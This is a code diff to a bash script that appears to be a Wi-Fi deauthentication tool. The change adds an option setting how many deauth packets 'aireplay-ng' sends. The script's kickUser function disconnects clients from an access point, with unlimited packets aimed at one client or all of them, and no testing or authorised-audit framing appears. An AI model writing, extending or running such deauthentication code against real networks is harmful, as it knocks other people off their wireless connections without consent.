@@ -12,7 +12,7 @@ fi
 # Get arguments 
 # reset True > disable monitor mode befor exit
 # r and l without : coz thir is no input 
-while getopts "b:e:vharl:c:t:" option ; 
+while getopts "b:e:vharl:c:t:d:" option ; 
 do
     case $option in
         e) # set wiff essid
@@ -39,6 +39,9 @@ do
             ;;
         v)
             allVendor=True
+            ;;
+        d)
+            numberOfKickPackets=$OPTARG
             ;;
         \?) # unexpected arguments 
             echo -e "\nunexpected argument run -h for help "
@@ -131,7 +134,7 @@ function GetMacList() {
         else
             cat result
         fi
-        sudo rm -f temp*
+        sudo rm -f temp* result
     fi
     echo -e "\n\n------------------- Results ---------------------\n"
     resetMode
@@ -143,6 +146,9 @@ function kickUser(){
     if [ $Kickall ]
     then
         sudo aireplay-ng --deauth 0 -a $1 $2
+    elif [ ! -z $numberOfKickPackets ]
+    then
+        sudo aireplay-ng --deauth $numberOfKickPackets -a $1 -c $2 $3 || echo -e "\nuse iwconfig [ interface ] channel [AP channel Num] then retry"
     else
         sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
     fi
